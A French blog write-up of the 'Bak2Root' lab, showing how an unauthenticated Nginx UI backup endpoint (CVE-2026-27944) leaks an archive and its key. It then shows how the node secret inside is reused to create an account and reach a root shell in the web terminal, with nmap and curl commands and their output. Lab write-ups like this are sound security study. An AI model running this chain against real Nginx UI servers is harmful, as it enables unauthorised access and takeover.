---
layout: single
header:
  overlay_image: /assets/images/banner-014.jpg
  overlay_filter: 0.6
toc: true
toc_depth: 6
toc_label: Table of Contents
title: "Bak2Root : de la sauvegarde non authentifiée (CVE-2026-27944) au shell root sur Nginx UI"
date: 2026-10-23
categories: [DFIR, Pentest]
tags: [pentest, nginx-ui, cve-2026-27944, ssrf, api-abuse, node-secret, terminal-web, privesc, ctf]
---

# Lab Bak2Root : exploitation Nginx UI — de la fuite de sauvegarde au shell root

> **Date du lab :** 23 octobre 2026
> **Vulnérabilité initiale :** CVE-2026-27944 (Nginx UI, endpoint `/api/backup` non authentifié)
> **Vecteur d'escalade :** réutilisation du secret de nœud (`X-Node-Secret`) divulgué dans la sauvegarde
> **Résultat :** ✅ flag local récupéré via le terminal web, dans un conteneur avec `uid=0(root)`

## Résultat

Le flag local récupéré dans le terminal web Nginx UI est :

\`\`\`text
flag_b5c64043_fc4c_43d3_9210_90fa2c22f5c0
\`\`\`

Le fichier `/root/proof.txt` n'a pas été trouvé dans l'environnement atteint. Le terminal web donnait toutefois `uid=0(root)` dans le conteneur Nginx UI. Cela confirme les privilèges root dans ce conteneur, pas nécessairement sur l'hôte ou dans un autre conteneur.

## 1. Reconnaissance réseau

### Premier scan

Commande exécutée depuis Kali :

\`\`\`bash
nmap -A 176.16.164.232
\`\`\`

Extrait de sortie :

\`\`\`text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.14
\`\`\`

Ce scan affichait les ports courants et identifiait SSH. Il ne démontrait pas que tous les autres ports étaient fermés.

### Scan TCP complet

Pour vérifier l'ensemble des ports TCP :

\`\`\`bash
nmap -Pn -p- --open -sV -T4 176.16.164.232
\`\`\`

Sortie fournie :

\`\`\`text
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.14
18082/tcp open  http    nginx 1.29.3
\`\`\`

Le service HTTP était donc sur le port `18082`, et non sur `9000`. Le port `9000` mentionné dans la configuration est un port interne de l'application.

## 2. Validation de la fuite de sauvegarde — CVE-2026-27944

La première requête au port 9000 a échoué, car aucun service n'y était directement exposé sur l'adresse cible :

\`\`\`bash
curl -i --max-time 8 http://176.16.164.232:9000/api/backup
\`\`\`

Résultat :

\`\`\`text
curl: (7) Failed to connect to 176.16.164.232 port 9000
\`\`\`

La requête a ensuite été répétée sur le port découvert :

\`\`\`bash
curl -sS --max-time 30 \
  -D headers.txt \
  -o backup.zip \
  http://176.16.164.232:18082/api/backup
\`\`\`

Vérification des métadonnées :

\`\`\`bash
head -n 1 headers.txt
grep -iE '^(Content-Type|Content-Disposition):' headers.txt
grep -qi '^X-Backup-Security:' headers.txt && echo 'X-Backup-Security présent'
file backup.zip
\`\`\`

Sortie observée :

\`\`\`text
HTTP/1.1 200 OK
Content-Type: application/zip
Content-Disposition: attachment; filename=backup-20261023-133839.zip
X-Backup-Security présent
backup.zip: Zip archive data, made by v2.0 UNIX
\`\`\`

Cela confirme que `/api/backup` répondait sans authentification et livrait une archive avec l'en-tête `X-Backup-Security`. L'avis du projet explique que l'endpoint divulgue la clé et l'IV nécessaires au déchiffrement de la sauvegarde [1]. Les valeurs de cet en-tête ne sont pas reproduites dans ce rapport, car elles sont des secrets.

## 3. Déchiffrement et inspection hors ligne

L'installation de PyCryptodome via pip a échoué car Kali n'avait pas de réseau vers PyPI :

\`\`\`text
Failed to establish a new connection: [Errno 101] Network is unreachable
\`\`\`

OpenSSL était disponible localement (version rapportée : 3.6.4). Le déchiffrement a donc été effectué avec un script Python qui lit la clé et l'IV de `headers.txt`, puis appelle `openssl enc -d -aes-256-cbc`. La clé n'a pas été affichée ni copiée dans le rapport.

Commande lancée :

\`\`\`bash
python3 decrypt_openssl.py
\`\`\`

Sortie :

\`\`\`text
Déchiffré : backup_out/hash_info.txt
Extrait : backup_out/nginx-ui
Extrait : backup_out/nginx
\`\`\`

Fichiers extraits recensés :

\`\`\`text
backup_out/hash_info.txt
backup_out/nginx/sites-available/dojo-internal.conf
backup_out/nginx/sites-enabled/dojo-internal.conf
backup_out/nginx/mime.types
backup_out/nginx/modules
backup_out/nginx/conf.d/sites-enabled.conf
backup_out/nginx/conf.d/nginx-ui.conf
backup_out/nginx/nginx.conf
backup_out/nginx/fastcgi_params
backup_out/nginx/scgi_params
backup_out/nginx/uwsgi_params
backup_out/nginx-ui/database.db
backup_out/nginx-ui/app.ini
\`\`\`

Le champ `version` de `hash_info.txt` indiquait `2.3.2`. Le premier grep des fichiers n'a pas trouvé de texte correspondant à `flag` ou `bak2root`, ce qui ne suffisait pas à exclure des indices dans la base SQLite.

## 4. Analyse des configurations et de la base

La configuration `app.ini` indiquait notamment :

\`\`\`text
[server]
host = 127.0.0.1
port = 9000

[node]
name = SecDojo Lab
secret = <masqué>
\`\`\`

Les commandes de configuration Nginx visibles comprenaient `nginx -t` et `nginx -s reload`. La valeur du secret de nœud, ainsi que les autres clés et jetons, sont volontairement masqués ici.

Le virtual host sauvegardé a été affiché avec :

\`\`\`bash
nl -ba backup_out/nginx/sites-available/dojo-internal.conf
\`\`\`

Sortie utile :

\`\`\`text
server {
    listen 8081;
    listen [::]:8081;
    server_name dojo-internal.local;

    # internal-only lab vhost
    location / {
        add_header Content-Type text/plain;
        return 200 "restricted internal node\n";
    }
}
\`\`\`

La base SQLite contenait entre autres une table `users` avec un compte `admin` et un hash de mot de passe bcrypt (`$2a$`, 60 caractères). Une tentative de casse avec John et `rockyou.txt` n'a pas trouvé le mot de passe et a été interrompue après environ 0,01 % de la wordlist. Cette piste n'a pas été nécessaire ensuite.

La table `nodes` contenait un enregistrement nommé `node-1`, configuré vers `http://nginx-demo-2:9000`. Le nœud était ensuite rapporté hors ligne par l'API (`status: false`). Les notifications trouvées étaient des avis de renouvellement de certificats de démonstration. Les sauvegardes de configuration faisaient référence à `ojbk.me`.

Un test HTTP avec l'en-tête `Host: dojo-internal.local` sur le port exposé renvoyait la page HTML de Nginx UI (`200 OK`), pas le texte « restricted internal node ». Le vhost semble donc interne et n'a pas été directement atteint par ce test.

## 5. Vérification de l'état d'installation et authentification API

L'endpoint d'installation a été testé ainsi :

\`\`\`bash
curl -sS -i --max-time 10 \
  -H 'Host: dojo-internal.local' \
  http://176.16.164.232:18082/api/install
\`\`\`

Corps de réponse :

\`\`\`json
{"lock":true,"timeout":false}
\`\`\`

L'installation était verrouillée. Il n'était donc pas justifié de supposer que la fenêtre non authentifiée de restauration était ouverte. Aucune restauration malveillante n'a été envoyée dans le déroulement observé.

Le secret `[node]` extrait localement de la sauvegarde a ensuite été utilisé dans l'en-tête `X-Node-Secret` pour tester l'API :

\`\`\`text
GET /api/nodes
X-Node-Secret: <valeur locale masquée>
\`\`\`

Résultat : `HTTP 200`. L'API a retourné les métadonnées du nœud. Son URL était `http://nginx-demo-2:9000`, mais son état était `false` et sa version vide. La documentation Nginx UI indique que le secret de nœud peut authentifier des requêtes API sans mot de passe [2].

## 6. Création d'un compte de lab

Un nouveau compte nommé `aka` a été créé au moyen de l'API, avec le même secret de nœud transmis depuis le fichier local. Le secret et le mot de passe défini ne sont pas inclus dans ce rapport.

Réponse observée :

\`\`\`text
HTTP 200
{"id":2,"created_at":"2026-10-23T13:58:50.572237208Z","updated_at":"2026-10-23T13:58:50.572237208Z","name":"aka","status":true,"enabled_2fa":false,"language":"en"}
\`\`\`

Les premières commandes `id`, `cat /home/local.txt` et `cat /root/proof.txt` avaient été saisies dans le terminal local Kali. Elles affichaient l'utilisateur `hitotsu` et des erreurs de fichier absent ou d'accès refusé : elles ne décrivaient pas la cible. La capture suivante a permis d'identifier le terminal web Nginx UI. Il fallait y saisir les commandes, et non à l'invite Kali.

## 7. Connexion à l'interface web et ouverture du terminal

Après la création du compte `aka`, l'interface Nginx UI a été ouverte dans le navigateur à l'adresse suivante :

\`\`\`text
http://176.16.164.232:18082/
\`\`\`

Une fois connecté avec le compte de lab, il fallait sélectionner **Terminal** dans le menu latéral gauche. L'interface s'affichait sur `http://176.16.164.232:18082/#/terminal`, avec la rubrique Terminal sélectionnée et les onglets de terminal visibles.
<p align="center"><a href="/assets/images/banan1.png"><img src="/assets/images/banan1.png"></a></p>
Le grand panneau noir correspond au terminal intégré. Il faut cliquer à l'intérieur de ce panneau pour lui donner le focus, puis saisir les commandes à l'invite qui apparaît. Les commandes doivent être tapées dans ce panneau, pas dans le terminal local Kali. Si le panneau Assistant affiche une erreur de connexion à OpenAI, cela concerne uniquement l'assistant intégré ; fermer ou masquer ce panneau ne ferme pas le terminal.

## 8. Terminal web et récupération du flag

Dans l'interface Nginx UI, le terminal intégré a ouvert un shell dont l'invite était :

\`\`\`text
root@8c525d1b69e7:/run/s6-rc:s6-rc-init:ecglpa/servicedirs/nginx-ui#
\`\`\`

Vérification dans ce terminal :

\`\`\`bash
hostname
id
\`\`\`

Sortie :

\`\`\`text
8c525d1b69e7
uid=0(root) gid=0(root) groups=0(root)
\`\`\`

La commande de lecture des flags a ensuite été lancée dans ce shell :

\`\`\`bash
cat /home/local.txt; cat /root/proof.txt
\`\`\`

Sortie :

\`\`\`text
flag_b5c64043_fc4c_43d3_9210_90fa2c22f5c0
cat: /root/proof.txt: No such file or directory
\`\`\`

Le premier flag, `/home/local.txt`, a donc été récupéré. Le second chemin n'existait pas dans le conteneur où le terminal s'exécutait. Aucun contenu de `/root/proof.txt` n'a été obtenu.

## 9. Interprétation de la chaîne

La séquence effectivement observée est :

1. Découverte du port HTTP `18082` par scan TCP complet.
2. Téléchargement anonyme de la sauvegarde via `/api/backup`.
3. Déchiffrement local avec la clé/IV divulguées dans l'en-tête de réponse.
4. Extraction de `app.ini`, révélant le secret de nœud.
5. Utilisation de `X-Node-Secret` pour accéder à l'API et créer un compte.
6. Ouverture du terminal web, qui a fourni un shell root dans le conteneur Nginx UI.
7. Lecture de `/home/local.txt` et récupération du flag.

La CVE-2026-27944 a servi à obtenir la sauvegarde et ses clés. L'accès administrateur ultérieur provenait de la réutilisation du secret de nœud divulgué dans cette sauvegarde. La piste `/api/restore` et l'exécution de commandes via une sauvegarde forgée n'ont pas été utilisées. Cette distinction est importante : le flag a été récupéré par le terminal web après l'accès API, pas par une restauration modifiée.

## Commandes finales à retenir

\`\`\`bash
# Tous les ports TCP puis identification des services
nmap -Pn -p- --open -sV -T4 176.16.164.232

# Télécharger la sauvegarde depuis le port exposé
curl -sS --max-time 30 -D headers.txt -o backup.zip \
  http://176.16.164.232:18082/api/backup

# Déchiffrer la sauvegarde hors ligne avec le script préparé
python3 decrypt_openssl.py

# Examiner les fichiers extraits
find backup_out -type f -print

# Dans le terminal web de Nginx UI, pas dans Kali
hostname
id
cat /home/local.txt
\`\`\`

**Hygiène des secrets :** `headers.txt`, `app.ini`, le hash bcrypt, le secret de nœud et le mot de passe du compte de lab contiennent des informations sensibles. Ils n'ont pas été reproduits dans ce rapport.

## Références

[1]: https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-g9w5-qffc-6762 "Avis CVE-2026-27944 sur la sauvegarde non authentifiée"
[2]: https://nginxui.com/guide/config-node "Documentation nginx-ui sur la configuration du nœud"
[3]: https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-w8p3-r29g-jg3p "Avis sur l'authentification par secret de nœud"
